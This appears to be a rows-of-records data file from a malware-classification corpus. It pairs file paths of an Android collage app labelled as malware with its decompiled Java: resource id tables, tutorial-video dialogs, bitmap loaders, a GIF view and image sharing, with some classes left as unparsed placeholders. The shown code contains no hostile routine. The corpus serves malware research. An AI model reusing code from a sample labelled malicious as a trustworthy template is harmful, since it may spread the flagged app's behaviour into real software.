boldpress_button=0x7f020034;   public static final int bookmark=0x7f020035;   public static final int bookmark_grid_button=0x7f020036;   public static final int bookmark_small=0x7f020037;   public static final int bookmark_tab_close=0x7f020038;   public static final int bookmark_tab_open=0x7f020039;   public static final int bookmark_tab_selector=0x7f02003a;   public static final int border_button=0x7f02003b;   public static final int box=0x7f02003c;   public static final int brightness_icon=0x7f02003d;   public static final int brush=0x7f02003e;   public static final int button_left=0x7f02003f;   public static final int button_right=0x7f020040;   public static final int canvas_button=0x7f020041;   public static final int center_button=0x7f020042;   public static final int center_press=0x7f020043;   public static final int centerpress_button=0x7f020044;   public static final int christmas_btn=0x7f020045;   public static final int clear_button=0x7f020046;   public static final int clear_text_button=0x7f020047;   public static final int close_button=0x7f020048;   public static final int color_blank=0x7f020049;   public static final int color_btn=0x7f02004a;   public static final int crop_button=0x7f02004b;   public static final int curve_button=0x7f02004c;   public static final int delete_button=0x7f02004d;   public static final int editor_button=0x7f02004e;   public static final int edittext_modified_states=0x7f02004f;   public static final int effect_black=0x7f020050;   public static final int effect_boost_1=0x7f020051;   public static final int effect_boost_2=0x7f020052;   public static final int effect_boost_3=0x7f020053;   public static final int effect_brightness=0x7f020054;   public static final int effect_button=0x7f020055;   public static final int effect_color_blue=0x7f020056;   public static final int effect_color_depth_32=0x7f020057;   public static final int effect_color_depth_64=0x7f020058;   public static final int effect_color_green=0x7f020059;   public static final int effect_color_red=0x7f02005a;   public static final int effect_contrast=0x7f02005b;   public static final int effect_emboss=0x7f02005c;   public static final int effect_engrave=0x7f02005d;   public static final int effect_flea=0x7f02005e;   public static final int effect_gamma=0x7f02005f;   public static final int effect_gaussian_blue=0x7f020060;   public static final int effect_grayscale=0x7f020061;   public static final int effect_highlight=0x7f020062;   public static final int effect_hue=0x7f020063;   public static final int effect_invert=0x7f020064;   public static final int effect_mean_remove=0x7f020065;   public static final int effect_reflaction=0x7f020066;   public static final int effect_round_corner=0x7f020067;   public static final int effect_saturation=0x7f020068;   public static final int effect_sepia=0x7f020069;   public static final int effect_sepia_blue=0x7f02006a;   public static final int effect_sepia_green=0x7f02006b;   public static final int effect_sheding=0x7f02006c;   public static final int effect_sheding_cyan=0x7f02006d;   public static final int effect_sheding_green=0x7f02006e;   public static final int effect_sheding_red=0x7f02006f;   public static final int effect_sheding_yellow=0x7f020070;   public static final int effect_smooth=0x7f020071;   public static final int effect_tint=0x7f020072;   public static final int effect_watermark=0x7f020073;   public static final int emoticon_button=0x7f020074;   public static final int emoticon_button_pressed=0x7f020075;   public static final int eraser=0x7f020076;   public static final int eraserall=0x7f020077;   public static final int exit_button=0x7f020078;   public static final int exit_button2=0x7f020079;   public static final int find=0x7f02007a;   public static final int flickr_button=0x7f02007b;   public static final int flightsearch_button_inactiv=0x7f02007c;   public static final int focused_background=0x7f02007d;   public static final int frame_button=0x7f02007e;   public static final int frameicon=0x7f02007f;   public static final int free=0x7f020080;   public static final int gadget_button=0x7f020081;   public static final int galleryadd_button=0x7f020082;   public static final int gift_button=0x7f020083;   public static final int googleimage_button=0x7f020084;   public static final int hdwallpaper_icon=0x7f020085;   public static final int help_button=0x7f020086;   public static final int hideopacity_button=0x7f020087;   public static final int history=0x7f020088;   public static final int history_small=0x7f020089;   public static final int home_button=0x7f02008a;   public static final int home_normal=0x7f02008b;   public static final int home_screen=0x7f02008c;   public static final int home_selected=0x7f02008d;   public static final int homemenu_button=0x7f02008e;   public static final int icon=0x7f02008f;   public static final int image=0x7f020090;   public static final int instragram=0x7f020091;   public static final int italic_button=0x7f020092;   public static final int italic_press=0x7f020093;   public static final int italicpress_button=0x7f020094;   public static final int keyboarddown=0x7f020095;   public static final int large=0x7f020096;   public static final int largest=0x7f020097;   public static final int left_button=0x7f020098;   public static final int left_press=0x7f020099;   public static final int leftpress_button=0x7f02009a;   public static final int line_button=0x7f02009b;   public static final int loading2=0x7f02009c;   public static final int medium=0x7f02009d;   public static final int message_button=0x7f02009e;   public static final int moman_icon=0x7f02009f;   public static final int momentcamalbum_home=0x7f0200a0;   public static final int momentcamgallery_home=0x7f0200a1;   public static final int more_button=0x7f0200a2;   public static final int mygallery_button=0x7f0200a3;   public static final int new_button=0x7f0200a4;   public static final int new_feature=0x7f0200a5;   public static final int new_pic=0x7f0200a6;   public static final int newadd_button=0x7f0200a7;   public static final int next_button=0x7f0200a8;   public static final int noapply_button=0x7f0200a9;   public static final int noframe_button=0x7f0200aa;   public static final int nomessage_button=0x7f0200ab;   public static final int normal_background=0x7f0200ac;   public static final int online_button=0x7f0200ad;   public static final int opacity=0x7f0200ae;   public static final int opacity_button=0x7f0200af;   public static final int open_button=0x7f0200b0;   public static final int paint=0x7f0200b1;   public static final int paint_pressed=0x7f0200b2;   public static final int pattern1=0x7f0200b3;   public static final int pattern10=0x7f0200b4;   public static final int pattern11=0x7f0200b5;   public static final int pattern12=0x7f0200b6;   public static final int pattern13=0x7f0200b7;   public static final int pattern14=0x7f0200b8;   public static final int pattern15=0x7f0200b9;   public static final int pattern16=0x7f0200ba;   public static final int pattern17=0x7f0200bb;   public static final int pattern18=0x7f0200bc;   public static final int pattern19=0x7f0200bd;   public static final int pattern1_1=0x7f0200be;   public static final int pattern1_2=0x7f0200bf;   public static final int pattern1_3=0x7f0200c0;   public static final int pattern1_4=0x7f0200c1;   public static final int pattern2=0x7f0200c2;   public static final int pattern20=0x7f0200c3;   public static final int pattern21=0x7f0200c4;   public static final int pattern22=0x7f0200c5;   public static final int pattern23=0x7f0200c6;   public static final int pattern24=0x7f0200c7;   public static final int pattern25=0x7f0200c8;   public static final int pattern26=0x7f0200c9;   public static final int pattern27=0x7f0200ca;   public static final int pattern28=0x7f0200cb;   public static final int pattern30=0x7f0200cc;   public static final int pattern31=0x7f0200cd;   public static final int pattern34=0x7f0200ce;   public static final int pattern6=0x7f0200cf;   public static final int pattern7=0x7f0200d0;   public static final int pattern8=0x7f0200d1;   public static final int pattern9=0x7f0200d2;   public static final int pattern_button=0x7f0200d3;   public static final int pattern_button2=0x7f0200d4;   public static final int photoframe_icon=0x7f0200d5;   public static final int pick_gallery_button=0x7f0200d6;   public static final int picker_button=0x7f0200d7;   public static final int pickgallery_button=0x7f0200d8;   public static final int pixabay_button=0x7f0200d9;   public static final int play_button=0x7f0200da;   public static final int pressed_background=0x7f0200db;   public static final int quote_button=0x7f0200dc;   public static final int rate_later=0x7f0200dd;   public static final int rate_no=0x7f0200de;   public static final int rate_yes=0x7f0200df;   public static final int record_button=0x7f0200e0;   public static final int refresh_button=0x7f0200e1;   public static final int reload_btn=0x7f0200e2;   public static final int reload_button=0x7f0200e3;   public static final int resize_button=0x7f0200e4;   public static final int right_button=0x7f0200e5;   public static final int right_press=0x7f0200e6;   public static final int rightpress_button=0x7f0200e7;   public static final int rounded_corner_box=0x7f0200e8;   public static final int rounded_corner_box_grid=0x7f0200e9;   public static final int save=0x7f0200ea;   public static final int save_button=0x7f0200eb;   public static final int save_share_button=0x7f0200ec;   public static final int search_button=0x7f0200ed;   public static final int second=0x7f0200ee;   public static final int second2=0x7f0200ef;   public static final int second3=0x7f0200f0;   public static final int setting_button=0x7f0200f1;   public static final int share_btn=0x7f0200f2;   public static final int share_button=0x7f0200f3;   public static final int showframe_button=0x7f0200f4;   public static final int showmessage_button=0x7f0200f5;   public static final int showopacity_button=0x7f0200f6;   public static final int skip_button=0x7f0200f7;   public static final int small=0x7f0200f8;   public static final int smallest=0x7f0200f9;   public static final int speech_blank=0x7f0200fa;   public static final int speech_bubble0=0x7f0200fb;   public static final int speech_bubble1=0x7f0200fc;   public static final int speech_bubble10=0x7f0200fd;   public static final int speech_bubble2=0x7f0200fe;   public static final int speech_bubble3=0x7f0200ff;   public static final int speech_bubble4=0x7f020100;   public static final int speech_bubble5=0x7f020101;   public static final int speech_bubble6=0x7f020102;   public static final int speech_bubble7=0x7f020103;   public static final int speech_bubble8=0x7f020104;   public static final int speech_bubble9=0x7f020105;   public static final int splash_screen=0x7f020106;   public static final int stop_button=0x7f020107;   public static final int tab_focus=0x7f020108;   public static final int tab_indicator=0x7f020109;   public static final int tab_press=0x7f02010a;   public static final int tab_selected=0x7f02010b;   public static final int tab_unselected=0x7f02010c;   public static final int tabpressed=0x7f02010d;   public static final int text_button=0x7f02010e;   public static final int textstyle1=0x7f02010f;   public static final int textstyle10=0x7f020110;   public static final int textstyle11=0x7f020111;   public static final int textstyle12=0x7f020112;   public static final int textstyle13=0x7f020113;   public static final int textstyle14=0x7f020114;   public static final int textstyle2=0x7f020115;   public static final int textstyle3=0x7f020116;   public static final int textstyle4=0x7f020117;   public static final int textstyle5=0x7f020118;   public static final int textstyle6=0x7f020119;   public static final int textstyle7=0x7f02011a;   public static final int textstyle8=0x7f02011b;   public static final int textstyle9=0x7f02011c;   public static final int textstyle_chinesetakeaway=0x7f02011d;   public static final int textstyle_go3v2=0x7f02011e;   public static final int textstyle_kato=0x7f02011f;   public static final int textstyle_manga=0x7f020120;   public static final int textstyle_mponderosa=0x7f020121;   public static final int textstyle_rosewood=0x7f020122;   public static final int textstyle_shanghai=0x7f020123;   public static final int title_search_ico=0x7f020124;   public static final int title_search_ico_disabled=0x7f020125;   public static final int top_exit_button=0x7f020126;   public static final int top_new_button=0x7f020127;   public static final int view_btn=0x7f020128;   public static final int view_button=0x7f020129;   public static final int wallpaper_button=0x7f02012a;   public static final int web_button=0x7f02012b; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\DrawingView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@55b5a021"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\e.code","public class e extends Dialog {   Activity a;   SharedPreferences b;   CheckBox c;   public e(  final Activity activity){     super(activity);     this.a=activity;     requestWindowFeature(1);     setContentView(R.layout.confirm_dialog3);     this.c=(CheckBox)findViewById(R.id.chk_hide);     setTitle(""New Feature"");     this.b=activity.getSharedPreferences(BaseActivity.SEARCH_PREFERENCE,0);     ((ImageButton)findViewById(R.id.close_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         if (e.this.c.isChecked()) {           e.this.a(e.this.c.isChecked());         }         this.dismiss();       }     } );     ((TextView)findViewById(R.id.howto1_text)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:6iMdljThbd8""));         intent.putExtra(""VIDEO_ID"",""6iMdljThbd8"");         activity.startActivity(intent);       }     } );     ((TextView)findViewById(R.id.howto2_text)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:jQW0YEX_DpU""));         intent.putExtra(""VIDEO_ID"",""jQW0YEX_DpU"");         activity.startActivity(intent);       }     } );     ((TextView)findViewById(R.id.howto3_text)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:buwDSw_Nry0""));         intent.putExtra(""VIDEO_ID"",""buwDSw_Nry0"");         activity.startActivity(intent);       }     } );     ((TextView)findViewById(R.id.howto4_text)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:oQnDq8Y6DjU""));         intent.putExtra(""VIDEO_ID"",""oQnDq8Y6DjU"");         activity.startActivity(intent);       }     } );     ((TextView)findViewById(R.id.howto5_text)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:bR5h6CWPQqA""));         intent.putExtra(""VIDEO_ID"",""bR5h6CWPQqA"");         activity.startActivity(intent);       }     } );     ((ImageButton)findViewById(R.id.howto1_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:6iMdljThbd8""));         intent.putExtra(""VIDEO_ID"",""6iMdljThbd8"");         activity.startActivity(intent);       }     } );     ((ImageButton)findViewById(R.id.howto2_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:jQW0YEX_DpU""));         intent.putExtra(""VIDEO_ID"",""jQW0YEX_DpU"");         activity.startActivity(intent);       }     } );     ((ImageButton)findViewById(R.id.howto3_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:buwDSw_Nry0""));         intent.putExtra(""VIDEO_ID"",""buwDSw_Nry0"");         activity.startActivity(intent);       }     } );     ((ImageButton)findViewById(R.id.howto4_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:oQnDq8Y6DjU""));         intent.putExtra(""VIDEO_ID"",""oQnDq8Y6DjU"");         activity.startActivity(intent);       }     } );     ((ImageButton)findViewById(R.id.howto5_button)).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:bR5h6CWPQqA""));         intent.putExtra(""VIDEO_ID"",""bR5h6CWPQqA"");         activity.startActivity(intent);       }     } );   }   public void a(  boolean z){     SharedPreferences.Editor edit=this.b.edit();     edit.putBoolean(BaseActivity.PREF_HIDE_DIALOG,z);     edit.commit();   } } public class e extends AsyncTask<Object,f,Object> {   private boolean c=false;   ArrayList a=new ArrayList();   e(){   }   public void a(){     this.a.add(Integer.valueOf(R.drawable.pattern1));     this.a.add(Integer.valueOf(R.drawable.pattern1_1));     this.a.add(Integer.valueOf(R.drawable.pattern1_2));     this.a.add(Integer.valueOf(R.drawable.pattern1_3));     this.a.add(Integer.valueOf(R.drawable.pattern1_4));     this.a.add(Integer.valueOf(R.drawable.pattern2));     this.a.add(Integer.valueOf(R.drawable.pattern6));     this.a.add(Integer.valueOf(R.drawable.pattern7));     this.a.add(Integer.valueOf(R.drawable.pattern8));     this.a.add(Integer.valueOf(R.drawable.pattern9));     this.a.add(Integer.valueOf(R.drawable.pattern10));     this.a.add(Integer.valueOf(R.drawable.pattern11));     this.a.add(Integer.valueOf(R.drawable.pattern12));     this.a.add(Integer.valueOf(R.drawable.pattern13));     this.a.add(Integer.valueOf(R.drawable.pattern14));     this.a.add(Integer.valueOf(R.drawable.pattern15));     this.a.add(Integer.valueOf(R.drawable.pattern16));     this.a.add(Integer.valueOf(R.drawable.pattern17));     this.a.add(Integer.valueOf(R.drawable.pattern18));     this.a.add(Integer.valueOf(R.drawable.pattern19));     this.a.add(Integer.valueOf(R.drawable.pattern20));     this.a.add(Integer.valueOf(R.drawable.pattern21));     this.a.add(Integer.valueOf(R.drawable.pattern22));     this.a.add(Integer.valueOf(R.drawable.pattern23));     this.a.add(Integer.valueOf(R.drawable.pattern24));     this.a.add(Integer.valueOf(R.drawable.pattern25));     this.a.add(Integer.valueOf(R.drawable.pattern26));     this.a.add(Integer.valueOf(R.drawable.pattern27));     this.a.add(Integer.valueOf(R.drawable.pattern28));     this.a.add(Integer.valueOf(R.drawable.pattern30));     this.a.add(Integer.valueOf(R.drawable.pattern31));     this.a.add(Integer.valueOf(R.drawable.pattern34));   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     x.this.ae=size;     x.this.ad=0;     for (int i=0; i < size; i++) {       int parseInt=Integer.parseInt(this.a.get(i).toString());       String string=x.this.D.getResources().getString(parseInt);       a aVar=new a(string,'/','.');       String a=aVar.a();       String b=aVar.b();       Bitmap decodeResource=BitmapFactory.decodeResource(x.this.D.getResources(),parseInt);       if (decodeResource != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeResource,dev.camera360.collage.a.b.a(x.this.D.getResources(),60),dev.camera360.collage.a.b.a(x.this.D.getResources(),60),true);         decodeResource.recycle();         if (createScaledBitmap != null) {           publishProgress(new f(createScaledBitmap,parseInt,"""",a,b,string));         }       }       if (this.c) {         return null;       }     }     return null;   }   public void b(){     this.c=true;   }   @Override public void onProgressUpdate(  f... fVarArr){     x.this.a(fVarArr);   }   @Override protected void onPostExecute(  Object obj){     if (this.c) {       x.this.aL.a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\f.code","public class f extends ay {   public f(  MotionEvent motionEvent){     super(motionEvent);   }   @Override public float a(  int i){     return this.a.getX(i);   }   @Override public float b(  int i){     return this.a.getY(i);   }   @Override public int a(){     return this.a.getPointerCount();   }   @Override public int c(  int i){     return this.a.getPointerId(i);   } } public static class f {   Bitmap a;   String b;   private int c;   private String d;   private String e;   private String f;   f(  Bitmap bitmap,  int i,  String str,  String str2,  String str3,  String str4){     this.a=bitmap;     this.c=i;     this.d=str;     this.e=str2;     this.f=str3;     this.b=str4;   }   public Bitmap a(){     return this.a;   }   public String b(){     return this.e;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\g.code","public class g extends BaseAdapter {   boolean a;   public int d;   File[] e;   Dialog f;   int j;   int k;   private o[] m;   private Context n;   private a o;   public int b=0;   public int c=0;   public String g=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER+ ""/MomentCam_Emoticon/"";   boolean h=false;   boolean i=false;   ArrayList<String> l=new ArrayList<>();   private boolean c(){     DisplayMetrics displayMetrics=this.n.getResources().getDisplayMetrics();     return displayMetrics.heightPixels >= 728 && displayMetrics.widthPixels >= 728;   }   public g(  Context context,  int i,  int i2,  boolean z,  Dialog dialog){     this.a=false;     this.d=1;     this.k=85;     this.n=context;     this.j=i;     this.d=i2;     this.a=z;     this.f=dialog;     if (c()) {       this.k=150;     }     a();   }   public void a(){     File file=new File(this.g);     if (file.exists()) {       this.e=file.listFiles();       if (this.e != null && this.e.length > 1) {         Arrays.sort(this.e,new Comparator<File>(){           @Override public int compare(          File file2,          File file3){             if (file2.lastModified() < file3.lastModified()) {               return 1;             }             if (file2.lastModified() == file3.lastModified()) {               return 0;             }             return -1;           }         } );       }     }     this.b=this.e.length;     this.c=(int)Math.ceil(this.b / 18.0f);     int i=(this.d - 1) * 18;     int i2=i + 18;     if (i2 > this.b) {       i2=this.b;     }     this.m=new o[i2 - i];     int i3=0;     while (i < i2) {       this.m[i3]=new o();       this.m[i3].c=this.e[i].getName();       i3++;       i++;     }     this.o=new a(this,null);     this.o.execute(this.m);   }   @Override public int getCount(){     return this.m.length;   }   @Override public Object getItem(  int i){     return this.m[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView;     o oVar=this.m[i];     if (view == null) {       imageView=new ImageView(this.n);       imageView.setLayoutParams(new AbsListView.LayoutParams(this.k,this.k));     }  else {       imageView=(ImageView)view;     }     if (oVar.e != null) {       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       imageView.setImageBitmap(oVar.e);     }     imageView.setTag(oVar.c);     return imageView;   }   public void d(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=3;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(this.g,str);       if (!file.exists()) {         return null;       }       return BitmapFactory.decodeFile(file.toString(),options);     }  catch (    Exception e) {       return null;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    g gVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=g.this.a(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       g.this.d();     }     @Override public void onPostExecute(    Void r3){       if ((g.this.f instanceof y) && g.this.a) {         ((y)g.this.f).b(g.this.c);       }     }   }   public void b(){     if (this.o != null && this.o.getStatus() != AsyncTask.Status.FINISHED) {       this.o.cancel(true);     }   } } public class g extends Thread implements DialogInterface.OnCancelListener {   private String b;   private Bitmap c;   private ProgressDialog d;   private boolean e=false;   public void a(  String str,  Bitmap bitmap) throws IOException {     File file=new File(x.this.n,BaseActivity.b(str));     if (file.exists()) {       file.delete();     }     FileOutputStream fileOutputStream=new FileOutputStream(file);     bitmap.compress(Bitmap.CompressFormat.JPEG,100,fileOutputStream);     fileOutputStream.flush();     fileOutputStream.close();     x.this.ap=file.getAbsolutePath();   }   public void b(  String str,  Bitmap bitmap) throws IOException {     if (x.this.ap.equals("""")) {       a(str,bitmap);     }     if (!x.this.ap.equals("""")) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + x.this.ap);       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       x.this.D.startActivity(Intent.createChooser(intent,""Share Image""));     }   }   public g(  String str,  Bitmap bitmap){     this.b=str;     this.c=bitmap;     this.d=new ProgressDialog(x.this.D);     this.d.setIndeterminate(true);     this.d.setMessage(x.this.D.getText(R.string.progress_dialog_sharing_image));     this.d.setCancelable(true);     this.d.setOnCancelListener(this);     this.d.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.e=true;   }   @Override public void run(){     try {       b(this.b,this.c);     }  catch (    IOException e) {       this.e=true;     }  finally {       this.c.recycle();     }     if (this.e) {       this.e=false;     }     if (this.d.isShowing()) {       this.d.dismiss();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\GifDecoderView.code","public class GifDecoderView extends ImageView { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\GifView.code","public class GifView extends View {   public static final int DECODE_STATUS_DECODED=2;   public static final int DECODE_STATUS_DECODING=1;   public static final int DECODE_STATUS_UNDECODE=0;   public static final int IMAGE_TYPE_DYNAMIC=2;   public static final int IMAGE_TYPE_STATIC=1;   public static final int IMAGE_TYPE_UNKNOWN=0;   public int a;   public int b;   private m c;   private Bitmap d;   private int e;   private int f;   private long g;   private int h;   private int i;   private String j;   private boolean k;   public GifView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.a=0;     this.b=0;     this.k=false;   }   public GifView(  Context context){     super(context);     this.a=0;     this.b=0;     this.k=false;   }   public InputStream getInputStream(){     if (this.j != null) {       try {         return new FileInputStream(this.j);       }  catch (      FileNotFoundException e) {       }     }     if (this.i > 0) {       return getContext().getResources().openRawResource(this.i);     }     return null;   }   public void setGif(  String str){     a(str,BitmapFactory.decodeFile(str));   }   public void a(  String str,  Bitmap bitmap){     this.i=0;     this.j=str;     this.a=0;     this.b=0;     this.k=false;     this.d=bitmap;     this.e=this.d.getWidth();     this.f=this.d.getHeight();     setLayoutParams(new LinearLayout.LayoutParams(this.e,this.f));   }   public void setGif(  int i){     a(i,BitmapFactory.decodeResource(getResources(),i));   }   public void a(  int i,  Bitmap bitmap){     this.j=null;     this.i=i;     this.a=0;     this.b=0;     this.k=false;     this.d=bitmap;     this.e=this.d.getWidth();     this.f=this.d.getHeight();     setLayoutParams(new LinearLayout.LayoutParams(this.e,this.f));   }   private void b(){     a();     this.h=0;     this.b=1;     new Thread(){       @Override public void run(){         GifView.this.c=new m();         GifView.this.c.a(GifView.this.getInputStream());         if (GifView.this.c.c == 0 || GifView.this.c.d == 0) {           GifView.this.a=1;         }  else {           GifView.this.a=2;         }         GifView.this.postInvalidate();         GifView.this.g=System.currentTimeMillis();         GifView.this.b=2;       }     } .start();   }   public void a(){     this.c=null;   }   @Override protected void onDraw(  Canvas canvas){     super.onDraw(canvas);     if (this.b == 0) {       canvas.drawBitmap(this.d,0.0f,0.0f,(Paint)null);       if (this.k) {         b();         invalidate();         return;       }       return;     }     if (this.b == 1) {       canvas.drawBitmap(this.d,0.0f,0.0f,(Paint)null);       invalidate();       return;     }     if (this.b == 2) {       if (this.a == 1) {         canvas.drawBitmap(this.d,0.0f,0.0f,(Paint)null);         return;       }       if (this.a == 2) {         if (this.k) {           if (this.g + this.c.a(this.h) < System.currentTimeMillis()) {             this.g+=this.c.a(this.h);             c();           }           Bitmap b=this.c.b(this.h);           if (b != null) {             canvas.drawBitmap(b,0.0f,0.0f,(Paint)null);           }           invalidate();           return;         }         canvas.drawBitmap(this.c.b(this.h),0.0f,0.0f,(Paint)null);         return;       }       canvas.drawBitmap(this.d,0.0f,0.0f,(Paint)null);     }   }   private void c(){     this.h++;     if (this.h >= this.c.a()) {       this.h=0;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3d1e1068"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\HomeActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5aa1b6d9"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\i.code","!org.eclipse.jdt.core.dom.TypeDeclaration@32bef929"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\id.code","public static final class id {   public static final int BANNER=0x7f070000;   public static final int IAB_BANNER=0x7f070002;   public static final int IAB_LEADERBOARD=0x7f070003;   public static final int IAB_MRECT=0x7f070001;   public static final int LinearLayout01=0x7f07001a;   public static final int ad_airpush=0x7f07008d;   public static final int add_btn=0x7f070047;   public static final int add_text_btn=0x7f070098;   public static final int addappicon_btn=0x7f070070;   public static final int addmoment_switcher=0x7f070050;   public static final int addmoment_switcher2=0x7f070069;   public static final int addmoment_switcher3=0x7f07006f;   public static final int appbrainbanner1=0x7f07008f;   public static final int appicon_btn=0x7f070117;   public static final int apply_button=0x7f070153;   public static final int apply_button2=0x7f07014b;   public static final int apply_layout=0x7f070152;   public static final int apply_layout2=0x7f07014a;   public static final int auto_update_prompt=0x7f07018b;   public static final int back_btn=0x7f07003c;   public static final int back_button=0x7f070046;   public static final int back_draw_btn=0x7f07011d;   public static final int back_erase_btn=0x7f070125;   public static final int back_message_btn=0x7f070130;   public static final int back_new_btn=0x7f070129;   public static final int back_page_button=0x7f07004d;   public static final int back_share_btn=0x7f070120;   public static final int back_text_btn=0x7f070111;   public static final int bannerView=0x7f07008c;   public static final int bgnd1=0x7f0700dd;   public static final int bgnd2=0x7f0700de;   public static final int bgnd3=0x7f0700df;   public static final int bgnd4=0x7f0700e0;   public static final int bgnd5=0x7f0700e1;   public static final int bgnd_text=0x7f0700d9;   public static final int blue_seek=0x7f07015c;   public static final int body_layout=0x7f0701c6;   public static final int bold_button=0x7f0700b5;   public static final int bookmarkFavIcon=0x7f070012;   public static final int bookmarkFlag=0x7f070011;   public static final int bookmarkLastVisit=0x7f07000e;   public static final int bookmarkTitle=0x7f07000b;   public static final int bookmarkURL=0x7f07000c;   public static final int bookmarkVisitCount=0x7f070010;   public static final int border_btn=0x7f070145;   public static final int border_layout=0x7f070149;   public static final int borderwidth_seek=0x7f07014f;   public static final int bottom_layout=0x7f070089;   public static final int bright_contrast_seeks=0x7f070156;   public static final int bright_seek=0x7f070157;   public static final int brightness_btn=0x7f070143;   public static final int browser=0x7f070017;   public static final int brush_layout=0x7f070131;   public static final int bubble_display=0x7f0700ba;   public static final int bubble_gallery=0x7f0700fb;   public static final int bubble_layout=0x7f0700fa;   public static final int buttonLayout=0x7f070004;   public static final int button_layout=0x7f070079;   public static final int camera360_btn=0x7f0700e9;   public static final int cancelButton=0x7f07019d;   public static final int cancel_button=0x7f07001c;   public static final int canvas_btn=0x7f0700da;   public static final int canvas_layout=0x7f07013f;   public static final int captionLastVisit=0x7f07000d;   public static final int captionVisitCount=0x7f07000f;   public static final int center_button=0x7f0700b3;   public static final int channelList=0x7f070038;   public static final int checkbox_auto_update=0x7f07018a;   public static final int chk_hide=0x7f070027;   public static final int chkeditor=0x7f070183;   public static final int choosecanvas_btn=0x7f070140;   public static final int chooseframe_btn=0x7f070141;   public static final int christmas_btn=0x7f07011b;   public static final int clearButton1=0x7f070193;   public static final int clearButton2=0x7f070197;   public static final int clearButton3=0x7f07019b;   public static final int clear_button=0x7f070007;   public static final int clear_text_btn=0x7f07009b;   public static final int closeButton=0x7f070005;   public static final int close_button=0x7f070016;   public static final int color_black=0x7f0700cf;   public static final int color_black2=0x7f07010f;   public static final int color_blue=0x7f0700ca;   public static final int color_blue2=0x7f07010a;   public static final int color_brown=0x7f0700bf;   public static final int color_brown2=0x7f070101;   public static final int color_btn=0x7f0700ef;   public static final int color_custom1=0x7f0700c6;   public static final int color_custom2=0x7f0700d1;   public static final int color_custom_border=0x7f07014d;   public static final int color_darkcream=0x7f0700c9;   public static final int color_darkcream2=0x7f070109;   public static final int color_darkskin=0x7f0700c8;   public static final int color_darkskin2=0x7f070108;   public static final int color_gold=0x7f0700d0;   public static final int color_gold2=0x7f070110;   public static final int color_green=0x7f0700c3;   public static final int color_green2=0x7f070105;   public static final int 